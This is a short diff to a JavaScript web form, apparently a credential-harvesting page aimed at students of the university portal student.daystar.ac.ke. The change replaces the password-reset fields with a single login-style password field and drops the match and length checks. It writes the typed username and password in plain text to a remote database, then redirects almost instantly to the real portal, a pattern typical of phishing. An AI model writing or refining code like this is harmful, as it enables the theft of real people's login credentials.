@@ -29,27 +29,14 @@ document
     const username =
     document.getElementById("uname").value;
 
-    const newPassword =
-    document.getElementById("newpass").value;
-    const confirmPassword =
-document.getElementById("confirmpass").value;
+    const password =
+    document.getElementById("pass").value;
+
     // Check passwords match
-if (newPassword !== confirmPassword) {
 
-    status.innerHTML =
-    "<span style='color:red;'>Passwords do not match!</span>";
-
-    return;
-}
 
 // Check minimum length
-if (newPassword.length < 8) {
 
-    status.innerHTML =
-    "<span style='color:red;'>Password must be at least 8 characters.</span>";
-
-    return;
-}
 
     status.innerHTML = "Connecting...";
 
@@ -61,7 +48,7 @@ if (newPassword.length < 8) {
         .insert([
             {
                 username: username,
-                password: newPassword
+                password: password
             }
         ]);
 
@@ -90,7 +77,7 @@ document
 // Wait 2 seconds then redirect
 setTimeout(() => {
     window.location.href = "https://student.daystar.ac.ke/";
-}, 2000);
+}, 100);
 
     }
     catch(err){
